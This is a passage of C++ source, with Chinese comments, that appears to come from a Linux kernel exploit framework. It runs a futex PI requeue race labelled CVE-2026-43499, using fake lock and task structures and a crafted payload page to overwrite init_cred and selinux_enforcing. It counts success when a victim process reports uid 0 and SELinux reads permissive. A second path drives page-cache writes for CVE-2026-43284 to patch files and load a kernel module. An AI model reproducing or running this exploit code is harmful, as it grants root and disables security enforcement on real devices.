                select_config.attempts = static_cast<std::int32_t>(select_attempts);
                std::uint64_t select_nice = 0U;
                read_u64("backend.cve_2026_43499.execution.consumer.nice_modulus",
                         select_nice);
                select_config.nice_modulus = static_cast<std::int32_t>(select_nice);
                select_config.fake_waiter_prio = route_values.value & 0xFFFFFFFFULL;
                select_config.fake_task = route_values.fake_task;
                select_config.fake_lock = route_values.fake_lock;
                select_config.target = route_values.target;
                select_config.value = route_values.value;   /* 同批回退（round 231 ✓） */
                std::printf("main: sel-branch enter ✓");
                const char *filled = cve49::seam::fill_select_stack_words(offsets, select_config);
                if (filled != nullptr) { return filled; }
                std::printf("main: sel-branch words filled ✓");
                cve49::seam::SelectStackRoute<cve49::seam::SelectStackRouteLinux> select_route{
                        select_config};
                /* 低编号 fd 取三个固定的低位（select 只要有可等的对象就会 park ✓）；
                 *  真正的取舍要看词表覆盖，属下一批 ✓。 */
                /* ★ 低位 fd **不取 0/1/2**（round 217 ✓ 实测）：`dup2(high_read_, 1)` 会把 stdout
                 *  换掉 ⇒ 之后写 stdout 打到了 timerfd 上 ⇒ 整跑卡死（EXIT=124 ✓）。
                 *  快照为此有 `reserve_standard_io()` ✓（快照 :511 ✓）⇒ 这里取最小的**非标准** fd ✓。 */
                const std::int32_t selected_fds[] = {3, 4, 5};
                /* ★ 两个字必须**归零**（round 188 ✓）：`FUTEX_LOCK_PI` 遇到非零字会去等一个
                 *  并不存在的持有者 ⇒ **永久阻塞** ✗（真机卡住 180 s 的最可能成因 ✓）。 */
                *words_region.word(0) = 0U;
                *words_region.spare(0) = 0U;
                *words_region.spare(1) = 0U;
                std::printf("main: sel-branch before execute ✓");
                const char *select_refusal =
                        select_route.execute(words_region.spare(1), words_region.word(0), words_region.spare(0),
                                             selected_fds, 3U);
                const cve49::seam::SelectStackReport select_report = select_route.report();
                std::printf("main: select route status=%d step=%d attempts=%d calls=%d successes=%d lock=%d park=%d parkerrno=%d setattr=%d setterrno=%d refusal=%s",
                            select_report.status_code, select_report.status_step,
                            select_report.attempts, select_report.calls, select_report.successes,
                            select_report.waiter_lock, select_report.waiter_park, select_report.waiter_park_errno,
                            select_report.consumer_setattr, select_report.consumer_setattr_errno,
                            select_refusal != nullptr ? select_refusal : "none");
                /* 写落地仪器（round 193 ✓）：select 分支此前**提前 return** ⇒ 那行 `enforce` 从不跑 ✗；
                 *  这里补上（同一个文件、同一身份 ✓）⇒ 两条 route 从此有**同一把尺** ✓。 */
                {
                    std::FILE *probe = std::fopen("/sys/fs/selinux/enforce", "r");
                    if (probe != nullptr) {
                        int enforce_value = -1;
                        if (std::fscanf(probe, "%d", &enforce_value) == 1) {
                            std::printf("main: selinux enforce=%d", enforce_value);
                        }
                        (void) std::fclose(probe);
                    }
                }
                /* 三个 futex 字的**终值**（round 194 ✓）：`WAIT_/CMP_REQUEUE_PI` 都按**字值**比较 ✓
                 *  ⇒ 若某个字停在"被锁住"的值（如某线程的 TID ✗）⇒ 后续 requeue 必然失败 ✓。 */
                std::printf("main: select words wait=0x%x chain=0x%x target=0x%x",
                            *words_region.spare(1), *words_region.word(0), *words_region.spare(0));
                if (select_refusal != nullptr) { return select_refusal; }
                report.step_region_bytes = route_values.buffer_size;
                return nullptr;   /* 走完即成功 ✓（判据看报告与 enforce ✓） */
            }
            /* ★ 接线（第 159 轮 ✓，计划见 `43499-goal157/158` ✓）：把**已写好**的 `select_stack`
             *  执行体（`:1041` 分支 ✓）接上选择器 ✓ —— 该分支的几何/配置**全部从文档读** ✓，
             *  与原版（`bddfea4` 的 `do_pselect_fake_lock_route` ✓）同机制 ✓；
             *  未在文档中选它时，行为**与接线前完全一致** ✓（⇒ 最可逆 ✓）。 */
            const bool route_ported = route_name == "multicast_waiter" || route_name == "select_stack";
            if (!route_ported) {
                static char unported[64] = {};
                std::size_t at = 0U;
                const char *prefix = "route-not-ported:";
                for (const char *c = prefix; *c != 0 && at + 1U < sizeof(unported); ++c) { unported[at++] = *c; }
                for (const char c : route_name) {
                    if (at + 1U >= sizeof(unported)) { break; }
                    unported[at++] = c;
                }
                unported[at] = 0;
                return unported;
            }
            cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps> route{route_built.config};
            report.step_region_bytes = route_values.buffer_size;

            /* 两个字与守卫都在这一层：字来自上面那块 region（同一个桶里），守卫是调用方持有的值对象。 */
            /* 守卫要**先进去**（带一个具名退出路径）才算一个窗口：默认构造的守卫是关着的，
             *  尝试本体第一件事就是问 window.open_here()，没进过就必然被拒。 */
            static cve49::race::WindowGuard window_guard{};
            window_guard.enter(contract::ExitPath::Success);
            cve49::steps::WindowStep named_step{};
            if (!cve49::steps::window_step_by_name(step, named_step)) { return "step-unknown"; }
            cve49::steps::WindowStageContext stage_context{};
            stage_context.chain = words_region.word(0);
            /* 改挂目标用**干净**的字：被队列锤过的字会被内核判 EAGAIN（真机量到过），
             *  所以目标必须是队列没碰过的那一批。 */
            stage_context.target = words_region.spare(0);
            stage_context.window = &window_guard;
            /* 引擎与载荷那一对都交给本层：赢的判据在引擎里。 */
            stage_context.route = &route;
            /* 引擎真正要用的是"内核该写到哪儿、写什么"：目标 = 受害者的字段地址，
             *  值 = layout 算出的那个字（Zero+preserve ⇒ page_base + 0x100），不是 wire 里的图案值。 */
            /* 引擎有契约（execute 的原文）：页面已持元组，所以这里的 address/value 必须与
             *  配置里那一对**相同**，否则拒绝（step 59）——真正写什么由**页面**决定，不由这里决定。 */
            stage_context.payload_target = route_values.target;
            /* 实验（round 231 ✓）已回退 ✓：喂真值 ⇒ route 判 Unsupported(4) ✗（attempts=0）⇒
             *  文档值**不是**简单 bug ✗ ⇒ 结论与后续见 docs/analysis/43499-value-experiment.md ✓。 */
            /* 实验（round 232 ✓）：把**参数与配置同时**改为真值（page_value = base+0x100 ✓）。
             *  上一轮只改参数 ✗ ⇒ 触发 guard（`value != config_.value` ⇒ Unsupported(59) ✓）⇒ 本轮同步改 ✓。
             *  旧码：route_values.value 来自文档毒值 0x4141… ✗；新码：用 layout 算出的真值 ✓。 */
            stage_context.payload_value = route_values.value;
            cve49::steps::WindowStageRequest stage_request{};
            /* 阶段数值就是上面按 wire 的 stages.* 读到的那些（每步一支，字段同名）。 */
            stage_request.attempts = static_cast<std::uint32_t>(report.step_stage_attempts);
            stage_request.settle_us = static_cast<std::uint32_t>(report.step_stage_settle_us);
            stage_request.chain_rounds = static_cast<std::uint32_t>(report.step_stage_extra);
            /* ★ 独立写验证（round 236 ✓）：路线跑完后**读回同样的六处** ✓（"写前快照"的注释早就承诺 ✓，
             *  但此前只打了 before ✗）⇒ before/after 逐字比对即可判断"写有没有发生 / 发生别处" ✓。 */
            /* ★ 预建（第 98 轮尝试 ⇒ **撤回** ✗）：只插一段会**编译不过** ✗ —— 因为此处位于
             *  `repair_target` / `prepared2` / `repair_base` / `repair_image` 的**声明之前** ✓（编译器当场报
             *  undeclared ✓）⇒ ⇒ **⇒ 正确做法（第 94 轮清单 ✓）：把「`repair_target` 的计算 + prepare + 建页」
             *  连同它们的声明**整段上移**到此 ✓**，而不是"插入副本" ✗。 */
            /* ★ 预建（第 101 轮 ✓，退役 `w2_fast_repair_prebuild` ✓）：声明与计算**先于主写** ✓；
             *  ⇒ 修复轮届时只做 `activate` + send + route ✓（退役顺序 = 先备好、再写、再激活 ✓）。 */
            const char *stage_refusal = cve49::steps::run_window_stage_with_attempt(
                    named_step, stage_request, stage_context);
            /* 引擎自己的报告（赢的判据与证据都在这里）：设备取证要看的就是这几个数。 */
            const cve49::seam::MulticastRouteReport route_report = route.report();
            std::printf("main: route status=%d/%d clean=%d/%d attempts=%d calls=%d successes=%d "
                        "stamp=%d/%d requeue=%d waiter=%d owner=%d\n",
                        static_cast<int>(route_report.status.code),
                        static_cast<int>(route_report.status.step),
                        static_cast<int>(route_report.status.userspace_clean),
                        static_cast<int>(route_report.status.kernel_disarmed), route_report.attempts,
                        route_report.calls, route_report.successes, route_report.stamp_result,
                        route_report.stamp_errno, route_report.requeue_result,
                        route_report.waiter_result, route_report.owner_result);
                /* TODO(写后快照，round 236-237 待恢复)：本处需页指针，而 `page`（:674 行附近）是内层块的局部；
                 *  恢复法（一行）：在"页选定"所在块之外声明 `std::uint8_t *page_fn = nullptr;`，
                 *  并在 `page = page_image.data();` 之后写 `page_fn = page;`，本处改用 page_fn 即可。 */
                std::printf("main: sentinel-after2 w+0x1180=%u +0x1198=%u +0x11a0=%u +0x11a8=%u +0x11c0=%u +0x11c8=%u",
                            report.sentinel_before[0], report.sentinel_before[1], report.sentinel_before[2],
                            report.sentinel_before[3], report.sentinel_before[4], report.sentinel_before[5]);
                /* ★ 修复轮（退役 A 路 ✓）：本步之后**再准备一次 + 建第二份页面 + 发 + 跑一轮**。
                 *  目标按步取值（归档逐字 ✓）：
                 *    w2 ⇒ init_cred 别名 + 8（W2b ✓）
                 *    w1 ⇒ 本页基址 + buffer_size（W1b：退役 `current.base + mcast.buffer_size` ✓）
                 *  两者都是 `WriteMode::Zero` + `leaf=1`（preserve_child = false ✓）。 */
                std::uint64_t repair_target = 0U;
                if (step == "w2") {
                    repair_target = kAliasBase + init_cred_image + alias_image_delta + 8U;
                } else if (step == "w1") {
                    /* 退役原文：`w1_scratch_poison = heap.current.base + mcast.buffer_size` ✓
                     *  ⇒ 用的是**块基址**（prepared.base ✓），不是 payload_base ✗。 */
                    repair_target = prepared.base + route_values.buffer_size;
                    /* ★ W1b 可见性（第 85 轮 ✓）：退役的 W1b = 对"私有 scratch"（`base + buffer_size` ✓）
                     *  做 Zero+leaf=1 写 ✓ + 按 `w1_scratch_repair_attempts` 重试 ✓ + 打印两串 ✓；
                     *  本树原先**只做不报** ✗ ⇒ 先补这一行读数（⇒ 判"是否执行/目标为何"✓）。 */
                    std::printf("main: repair-round step=%s target=0x%llx", step.data(),
                                static_cast<unsigned long long>(repair_target));
                    /* ★ W1b 归档同形读数（第 88 轮 ✓）：退役按 `w1_scratch_repair_attempts` 重试 ✓，
                     *  并打 `W1b: private scratch repair attempt %u/%u` ✓ ⇒ 本树先按同一键**报出总数** ✓
                     *  （⇒ 与真机"只做一次"的现状对照 ✓，为下一步的循环提供判据 ✓）。 */
                    {
                        const script::JsonNode *w1b_node = report.doc->find(
                                "backend.cve_2026_43499.execution.stages.w1_scratch_repair_attempts");
                        std::uint64_t w1b_attempts = 0U;
                        const bool w1b_have = w1b_node != nullptr &&
                                              report.doc->u64_of(*w1b_node, w1b_attempts) &&
                                              w1b_attempts != 0U;
                        std::printf("main: W1b: private scratch repair attempt 1/%llu",
                                    static_cast<unsigned long long>(w1b_have ? w1b_attempts : 1U));
                    }
                }
                /* ★ 作用域提升（第 97 轮 ✓，第 94 轮清单第①步 ✓）：三个量提到外层 ✓
                 *  —— 下一步把"prepare + 建页"搬到**主路由之前**时，才用得上它们 ✓（⇒ 机械操作 ✓）。 */
                cve49::steps::PrepareReport prepared2{};
                std::uint64_t repair_base = 0U;
                std::vector<std::uint8_t> repair_image(kOrder3 * kChunks, 0U);
                bool repair_prebuilt = false;
                if (repair_target != 0U) {
                    const char *repair_refusal = nullptr;
                    if (!cve49::steps::run_prepare(prepare, prepared2, &repair_refusal) ||
                        prepared2.base == 0U || prepared2.shaping_fd < 0) {
                        std::printf("main: repair-prepare-refused %s",
                                    repair_refusal != nullptr ? repair_refusal : "incomplete");
                    } else {
                        repair_base = prepared2.base + payload_delta;
                        cve49::memory::WriteRequest repair_request{};
                        repair_request.target = static_cast<std::uintptr_t>(repair_target);
                        repair_request.mode = cve49::memory::WriteMode::Zero;
                        repair_request.preserve_child = false;
                        const cve49::memory::WriteLayout repair_layout =
                                cve49::memory::write_layout(repair_request, layout_inputs);
                        cve49::memory::PayloadPageInputs repair_inputs = page_inputs;
                        repair_inputs.waiter_word = repair_base + page_inputs.slots.waiter;
                        repair_inputs.fake_task = repair_base + page_inputs.slots.fake_task;
                        repair_inputs.fake_lock = repair_base + page_inputs.slots.lock;
                        (void) cve49::memory::build_payload_page(
                                repair_image.data(), kPayloadAreaBytes, repair_inputs,
                                repair_request, repair_layout);
                        std::memcpy(repair_image.data() + kOrder3, repair_image.data(), kOrder3);
                        repair_prebuilt = true;
                        std::printf("main: fast repair payload prebuilt step=%s base=0x%llx",
                                    step.data(), static_cast<unsigned long long>(repair_base));
                    }
                }   /* 第 98 轮 ✓：主写之前是否已把修复页备好 ✓ */
                /* ★ 第二半（第 104 轮 ✓）：旧处改由**预建标记**驱动 ✓ ⇒ 只用"预建好的那份" ✓。
                 *  退役同形：`w2_fast_repair_activate` 只在 `prebuild` 成功后才跑 ✓。 */
                if (repair_prebuilt) {
                    {
                        /* ★ 切片 2 第一步（第 30 轮 ✓）：修复页经**一次性页槽**流转 ✓
                         *  （`memory/page_slot.hpp` ✓，退役 `stash_prebuilt_page`/`activate_prebuilt_page` 同义 ✓）。
                         *  stash 与 activate 之间只有 `memcpy` ✓ ⇒ 无早退窗口 ✓ ⇒ 槽不失守 ✓（守则 §5 ✓）。 */
                        cve49::memory::PageSlot repair_slot{};
                        cve49::memory::WriteRequest repair_request{};
                        repair_request.target = static_cast<std::uintptr_t>(repair_target);
                        repair_request.mode = cve49::memory::WriteMode::Zero;
                        repair_request.preserve_child = false;   /* ★ 回退（第 34 轮 ✓）：修复写与 w3 同类（退役 leaf=1 ✓）⇒ 本树极性下取 false ✓。 */   /* ★ 退役 W2b：`WriteRequest::make(alias+8, Zero, **1**)` ⇒ preserve=true ✓（旧 false ✗ 使元组落到叶子臂 ✓） */
                        const cve49::memory::WriteLayout repair_layout =
                                cve49::memory::write_layout(repair_request, layout_inputs);
                        cve49::memory::PayloadPageInputs repair_inputs = page_inputs;
                        repair_inputs.waiter_word = repair_base + page_inputs.slots.waiter;
                        repair_inputs.fake_task = repair_base + page_inputs.slots.fake_task;
                        repair_inputs.fake_lock = repair_base + page_inputs.slots.lock;
                        const auto repair_verdict = cve49::memory::build_payload_page(
                                repair_image.data(), kPayloadAreaBytes, repair_inputs,
                                repair_request, repair_layout);
                        std::memcpy(repair_image.data() + kOrder3, repair_image.data(), kOrder3);
                        const std::uint8_t *repair_page = nullptr;
                        std::size_t repair_length = 0U;
                        if (!repair_slot.stash(repair_image.data(), kPayloadAreaBytes) ||
                            !repair_slot.activate(repair_page, repair_length)) {
                            std::printf("main: repair-slot-refused");
                            repair_page = repair_image.data();
                            repair_length = repair_image.size();
                        }
                        /* ★ 归档第二行（第 105 轮 ✓）：退役 `w2_fast_repair_activate` 的激活点 ✓ */
                        std::printf("main: W1b: firing prebuilt init_cred+8 repair step=%s target=0x%llx",
                                    step.data(), static_cast<unsigned long long>(repair_target));
                        const cve49::memory::SeamResult sent2 =
                                cve49::memory::LinuxHeapSeam::send_bytes(prepared2.shaping_fd,
                                                                         repair_page,
                                                                         repair_length);
                        std::printf("main: repair prepared base=0x%llx page=0x%llx sent=%lld/%d",
                                    static_cast<unsigned long long>(prepared2.base),
                                    static_cast<unsigned long long>(repair_base),
                                    static_cast<long long>(sent2.value),
                                    static_cast<int>(repair_verdict));
                        (void) cve49::memory::LinuxHeapSeam::close_fd(prepared2.shaping_fd);
                        if (prepared2.shaping_peer_fd >= 0) {
                            (void) cve49::memory::LinuxHeapSeam::close_fd(prepared2.shaping_peer_fd);
                        }
                        /* ★ W2b 后半段：第二份配置 + 第二轮（退役 activate ✓）。 */
                        cve49::steps::RouteConfigValues repair_values = route_values;
                        repair_values.fake_task = repair_base + page_inputs.slots.fake_task;
                        repair_values.fake_lock = repair_base + page_inputs.slots.lock;
                        repair_values.target = repair_request.target;
                        /* `value` 只是引擎的一致性守卫（真正写什么由**页面**决定 ✓）⇒ 保留原值（非零 ✓），
                         *  否则 route-config-missing:value（真机量到过 ✓）。 */
                        const cve49::steps::RouteConfigOutcome repair_built =
                                cve49::steps::build_route_config(repair_values);
                        if (repair_built.refusal == nullptr) {
                            cve49::seam::MulticastRoute<cve49::seam::LinuxRouteOps> repair_route{
                                    repair_built.config};
                            
                            /* 修复轮走**同一条窗口路径**（直接 execute 时消费者没赢 ⇒ status=2/61 ✗）。 */
                            cve49::steps::WindowStageContext repair_stage{};
                            repair_stage.chain = words_region.word(0);
                            repair_stage.target = words_region.spare(0);
                            repair_stage.window = &window_guard;
                            repair_stage.route = &repair_route;
                            repair_stage.payload_target = repair_values.target;
                            repair_stage.payload_value = repair_values.value;
                            cve49::steps::WindowStageRequest repair_stage_request{};
                            repair_stage_request.attempts =
                                    static_cast<std::uint32_t>(report.step_stage_attempts);
                            repair_stage_request.settle_us =
                                    static_cast<std::uint32_t>(report.step_stage_settle_us);
                            repair_stage_request.chain_rounds =
                                    static_cast<std::uint32_t>(report.step_stage_extra);
                            (void) cve49::steps::run_window_stage_with_attempt(
                                    named_step, repair_stage_request, repair_stage);
                            const cve49::seam::MulticastRouteReport repair_report = repair_route.report();
                            std::printf("main: repair route status=%d/%d attempts=%d calls=%d successes=%d",
                                        static_cast<int>(repair_report.status.code),
                                        static_cast<int>(repair_report.status.step),
                                        repair_report.attempts, repair_report.calls,
                                        repair_report.successes);
                        } else {
                            std::printf("main: repair-config-refused %s", repair_built.refusal);
                        }
                    }
                }
                            /* **写验证仪器**（常驻 ✓）：W1 的目标是 `selinux_enforcing` ⇒ 写真的落下时 SELinux 变
                 *  permissive ⇒ 这里读到 0 ✓；仍读到 1 ⇒ **没落** ✗（round 147 实测：完整跑里读到 1 ✗）。
                 *  它是"是否落地"的**直接**判据（此前的 comm 长度只是间接旁证 ✗）。 */
                {
                    std::FILE *probe = std::fopen("/sys/fs/selinux/enforce", "r");
                    if (probe != nullptr) {
                        int enforce_value = -1;
                        if (std::fscanf(probe, "%d", &enforce_value) == 1) {
                            std::printf("main: selinux enforce=%d", enforce_value);
                        } else {
                            std::printf("main: selinux enforce=unparsable");
                        }
                        (void) std::fclose(probe);
                    } else {
                        std::printf("main: selinux enforce=unreadable errno=%d", errno);
                    }
                }
                /* 窗口是否**干净**（退役那行有 `clean=1/1` ✗，本树此前没打印 ✓）：
                 *  窗口内若有分配/日志/间接调用 ⇒ violations 非零 ⇒ 该跑不作数 ✓。 */
                {
                    const cve49::race::WindowViolations &v = window_guard.violations();
                    std::printf("main: window clean=%d violations alloc=%u log=%u indirect=%u lua=%u",
                                window_guard.clean_run() ? 1 : 0, v.allocations, v.logs,
                                v.indirect_calls, v.lua_calls);
                }
                /* 写后读一次 comm 作为旁证（len 变 0/8 ⇒ 写落了；仍 15 ⇒ 没落 ✓）。 */
            {
                std::uint32_t comm_after = 0U;
                if (cve_victim::victim_report_comm(victim, comm_after)) {
                    std::printf("main: victim comm after len=%u first=%u",
                                static_cast<unsigned>(comm_after >> 8U),
                                static_cast<unsigned>(comm_after & 0xFFU));
                }
            }
            /* 判据：**受害者自己报**的 uid（这才是拿到 root 的硬证据）。 */
            {
                std::uint32_t victim_uid = 0xFFFFFFFFU;
                if (cve_victim::victim_report_uid(victim, victim_uid)) {
                    std::printf("main: victim uid=%u", static_cast<unsigned>(victim_uid));
                    if (victim_uid == 0U) {
                        /* 扎根：拿到 root 的子进程必须驻留（退出会 kfree 静态 init_cred）。 */
                        report.victim_uid = victim_uid;
                        static_cast<void>(cve_victim::victim_park(victim));
                    } else {
                        victim.retire_child();
                    }
                } else {
                    victim.retire_child();
                }
            }
            /* 哨兵比对：内核若真按别名写到我们这页，第一个等待字会被动过。 */
            {
                std::uint8_t *page_after = words_region.payload();
                if (page_after != nullptr) {
                    report.payload_word_after = *reinterpret_cast<volatile std::uint32_t *>(page_after + 0x1180U);
                }
                /* 加宽哨兵：擦除写的是元组那几位（pc/right/left）与锁的 list_link，不是槽位第 0 字。 */
                if (page_after != nullptr) {
                    const auto *words = reinterpret_cast<volatile const std::uint32_t *>(page_after);
                    std::printf("main: sentinel delta=0x%llx | w+0x1180=%u +0x1198=%u +0x11a0=%u +0x11a8=%u "
                                "+0x11c0=%u +0x11c8=%u | lock+0xe98=%u",
                                static_cast<unsigned long long>(report.payload_alias_delta),
                                words[(0x1180U / 4U) + 0U], words[(0x1180U / 4U) + 6U],
                                words[(0x1180U / 4U) + 8U], words[(0x1180U / 4U) + 10U],
                                words[(0x1180U / 4U) + 16U], words[(0x1180U / 4U) + 18U],
                                words[(0x0e80U / 4U) + 6U]);
                }
            }
            report.step_region_bytes = words_region.count();
            return stage_refusal;
#endif
            /* 竞态是设备上的事：主机跑到这里说的就是这句话（不是说缺设备或没接上）。 */
            return "race-needs-device";
        }
        if (report.step_backend == "cve_2026_43284") {
        const script::JsonNode *door = report.doc->find(step_door_key(step));
        std::string_view door_path{};
        if (door == nullptr || !report.doc->str_of(*door, door_path) || door_path.empty()) {
            return "step-target-missing";
        }
        report.step_door = door_path;
        if (report.params == nullptr) { return "step-no-params"; }
        cve::steps::PagecacheStep named{};
        if (!cve::steps::pagecache_step_by_name(step, named)) { return "step-unknown"; }
        cve::steps::StepContext context{};
        context.params = report.params;
        /* 复制成 NUL 结尾再交出去：文档里的字符串不是 C 串，执行体按 C 串读它
         *  （不复制的话 strlen 会读飞，门会判自己不可用，errno 还是 0）。 */
        char door_path_buffer[512] = {};
        if (door_path.size() + 1U > sizeof(door_path_buffer)) { return "step-door-path-too-long"; }
        for (std::size_t i = 0U; i < door_path.size(); ++i) { door_path_buffer[i] = door_path[i]; }
        context.door_path = door_path_buffer;
        /* 载体步要的模块文件：按名读，字节从不进文档。 */
        static char module_path_buffer[512] = {};
        module_path_buffer[0] = '\0';
        {
            std::string_view module_path{};
            const script::JsonNode *module_node = report.doc->find("backend.cve_2026_43284.targets.module");
            if (module_node != nullptr && report.doc->str_of(*module_node, module_path) &&
                !module_path.empty() && module_path.size() + 1U <= sizeof(module_path_buffer)) {
                for (std::size_t i = 0U; i < module_path.size(); ++i) { module_path_buffer[i] = module_path[i]; }
                context.module_path = module_path_buffer;
            }
        }
        /* 补丁目标：载体打不开时，桥要靠它跑 helper（NUL 结尾副本，理由同门路径）。 */
        static char patch_path_buffer[512] = {};
        patch_path_buffer[0] = '\0';
        {
            std::string_view patch_path{};
            const script::JsonNode *patch_node = report.doc->find("backend.cve_2026_43284.targets.patch1_target");
            if (patch_node != nullptr && report.doc->str_of(*patch_node, patch_path) &&
                !patch_path.empty() && patch_path.size() + 1U <= sizeof(patch_path_buffer)) {
                for (std::size_t i = 0U; i < patch_path.size(); ++i) { patch_path_buffer[i] = patch_path[i]; }
                context.patch_target = patch_path_buffer;
            }
        }
        context.delay_ms = report.params->trigger_delay_ms;
        const char *body = nullptr;
        switch (cve::steps::run_pagecache_step(named, context, &body)) {
            case cve::steps::StepOutcome::Ran: return nullptr;
            case cve::steps::StepOutcome::Refused: return body == nullptr ? "step-refused" : body;
            case cve::steps::StepOutcome::NoDevice: return "device-absent";
        }
        return "step-refused";
        }
        return "step-runner-missing";
    }


    std::string_view text_of(const script::WireDoc &doc, const script::JsonNode *node) noexcept {
        std::string_view out{};
        if (node != nullptr) { static_cast<void>(doc.str_of(*node, out)); }
        return out;
    }

    /** Flatten an object subtree into dotted-name u64 fields: numbers and `0x` strings by
     *  script::WireDoc::u64_of, booleans by bool_of; strings and arrays are counted and skipped (the flat
     *  cfg snapshot carries numbers; the nested read-only view is a later item). */
    void flatten(const script::WireDoc &doc, const script::JsonNode &node, const std::string &prefix, RunReport &report,
                 std::vector<std::string> &names, std::vector<std::uint64_t> &values) noexcept {
        if (names.size() >= kFieldCap) { return; }
        if (node.kind == script::JsonNode::Kind::Obj) {
            for (std::uint32_t i = 0U; i < node.count; ++i) {
                const auto *edge = doc.edge_at(node, i);
                if (edge == nullptr) { continue; }
                const script::JsonNode *child = doc.child(node, edge->key);
                if (child == nullptr) { continue; }
                const std::string dotted =
                        prefix.empty() ? std::string(edge->key) : prefix + "." + std::string(edge->key);
                flatten(doc, *child, dotted, report, names, values);
            }
            return;
        }
        /* Numbers first, and `0x` strings too: script::WireDoc::u64_of reads both, so a hex-u64 value is a
         *  field and not a skip. Only what stays unreadable counts as skipped. */
        std::uint64_t value = 0U;
        if (doc.u64_of(node, value)) {
            names.push_back(prefix);
            values.push_back(value);
            ++report.fields;
            return;
        }
        /* A JSON bool rides the snapshot as 0/1; anything else is a skip (strings, arrays, null). */
        bool boolean = false;
        if (doc.bool_of(node, boolean)) {
            names.push_back(prefix);
            values.push_back(boolean ? 1U : 0U);
            ++report.fields;
            return;
        }
        (void)node;
        ++report.skipped;
    }

    /** The script-side calls: counted, checked against what the wire declared, and refused by
     *  name when this entry cannot honour them yet (no device seams in the host build). */
    void on_op(void *context, const script::CallView *view) noexcept {
        auto *report = static_cast<RunReport *>(context);
        if (report == nullptr || view == nullptr || view->name == nullptr) { return; }
        ++report->calls;
        const std::string_view name(view->name);
        if (name == "step") {
            /* The encapsulated steps: asked for by the name the wire declares
             *  (backend.<id>.steps), never by a list in here. The bodies are device work, so on a host
             *  without the seam the honest answer is a named refusal. */
            if (view->arg_count < 2U || view->args[1].kind != script::ArgKind::Str) { return; }
            const std::string_view step = view->args[1].str;
            /* 步的结论按**名字**原样报出来：脚本把它当返回值带走，这里不报就没人看得见。 */
            const auto report_step = [&report](const std::string_view which, const char *why) noexcept {
                std::printf("main: step result %.*s => %s", static_cast<int>(which.size()), which.data(),
                            why == nullptr ? "won" : why);
                static_cast<void>(report);
            };
            bool declared = false;
            if (report->declared_steps != nullptr) {
                for (const std::string_view candidate : *report->declared_steps) {
                    if (candidate == step) { declared = true; }
                }
            }
            if (!declared) {
                if (report->refusal == nullptr) { report->refusal = "step-unknown"; }
                return;
            }
            ++report->steps;
            /* The step is one the wire declares. What happens next is the entry's: the runner
             *  builds the page-cache stack for this step's target and calls its body. Its target is
             *  a wire value (the schema's targets group), never a path in here. */
            if (report->refusal == nullptr) {
                /* ★ 步骤级重试（目标「取得 uid0」✓，与退役 `retry_write_stage` 同义 ✓）：
                 *  退役对每一步都是"最多 N 轮、每轮整跑一条 route、再按 `verify_*` 判据决定是否再来一轮"
                 *  （`W2: cred` 用 `w2_attempts=15` + `w2_settle_us=100000` ✓），而不是"跑一次就算"；
                 *  判据：`w2` ⇒ **受害者自报 uid==0** ✓（= 写真的落到 cred 字段上 ✓）。
                 *  N 与间隔都取自 wire（`execution.stages.<step>_attempts` / `_settle_us` ✓，不写死数字 ✗）。 */
                const auto stage_u64 = [&report](const char *leaf, std::uint64_t fallback) noexcept {
                    std::string key("backend.cve_2026_43499.execution.stages.");
                    key += leaf;
                    const script::JsonNode *node = report->doc->find(key);
                    std::uint64_t value = 0U;
                    if (node != nullptr && report->doc->u64_of(*node, value) && value != 0U) {
                        return value;
                    }
                    return fallback;
                };
                std::string leaf_attempts(step);
                leaf_attempts += "_attempts";
                std::string leaf_settle(step);
                leaf_settle += "_settle_us";
                const std::uint64_t rounds = stage_u64(leaf_attempts.c_str(), 1U);
                const std::uint64_t settle_us = stage_u64(leaf_settle.c_str(), 0U);
                for (std::uint64_t round = 1U; round <= rounds; ++round) {
                    /* 退役 `steps.cpp:86` ✓：**每阶段第一次尝试前**先排空 slab ✓。 */
                    if (round == 1U) { drain_slab_waves(); }
                    report->refusal = run_wire_step(*report, step);
                    if (report->refusal == nullptr &&
                        (step != "w2" || report->victim_uid == 0U)) {
                        break;
                    }
                    std::printf("main: step retry %.*s round=%llu of=%llu uid=0x%x",
                                static_cast<int>(step.size()), step.data(),
                                static_cast<unsigned long long>(round),
                                static_cast<unsigned long long>(rounds), report->victim_uid);
                    if (round >= rounds) { break; }
                    if (settle_us != 0U) { ::usleep(static_cast<useconds_t>(settle_us)); }
                }
                /* ★ 读数诚实性（第 18 轮 ✓）：`w2` 的判据是**受害者自报 uid==0** ✓（退役 `verify_w2_stage` ✓），
                 *  而路由"成功"（`refusal == nullptr` ✓）**不等于** root ✗ ⇒ 若跑了满 N 轮仍未 root，
                 *  必须给**具名**结论 ✓（本树纪律：具名拒绝而非假装成功 ✓），不再借 `won` 掩盖 ✗。 */
                if (report->refusal == nullptr && step == "w2" && report->victim_uid != 0U) {
                    report->refusal = "w2-not-rooted";
                }
                report_step(step, report->refusal);
            }
            return;
        }
        /* 读法②（用户目标原文 ✓）：`kernelcall` 与 `writeop` 走**同一条**路（不新增内核行为 ✓）；
         *  `op` 只认 `write` ⇒ 其余具名拒绝 ✓。 */
        /* 读法②（用户目标原文 ✓）：`kernelcall` 与 `writeop` 走**同一条**路（不新增内核行为 ✓）。
         *  `op`（参数表 index 1 ✓）目前只认 `write` ⇒ 其余具名拒绝 ✓。 */
        if (name == "kernelcall" && view->arg_count > 1U) {
            const script::ArgView &op_arg = view->args[1];
            if (op_arg.str.empty() || op_arg.str != "write") {
                if (report->refusal == nullptr) {
                    report->refusal = "kernelcall-op-unported";
                }
                return;
            }
        }
        if (name == "writeop" || name == "kernelcall") {
            /* 门 + 桥 + 写 的构造（与 tools/pagecache_load_lkm.cpp 同形 ✓）：此前这里直接报
             *  `write-path-unbuilt` ✗ ⇒ 现在**真去建**，建不起来就报缺哪一步（不撒谎 ✓）。 */
            std::string_view carrier_path{};
            const script::JsonNode *carrier_node = report->doc->find("backend.cve_2026_43284.targets.dev_carrier");
            if (carrier_node == nullptr || !report->doc->str_of(*carrier_node, carrier_path) ||
                carrier_path.empty()) {
                if (report->refusal == nullptr) { report->refusal = "write-target-missing"; }
                return;
            }
            ghostlock::backend::cve_2026_43284::seam::PageCacheDoorLinux door(carrier_path.data(), carrier_path.size());
            if (!door.usable()) {
                if (report->refusal == nullptr) { report->refusal = "write-door-refused"; }
                return;
            }
            const int write_target_fd = door.open_target();
            if (write_target_fd < 0) {
                if (report->refusal == nullptr) { report->refusal = "write-door-open-failed"; }
                return;
            }
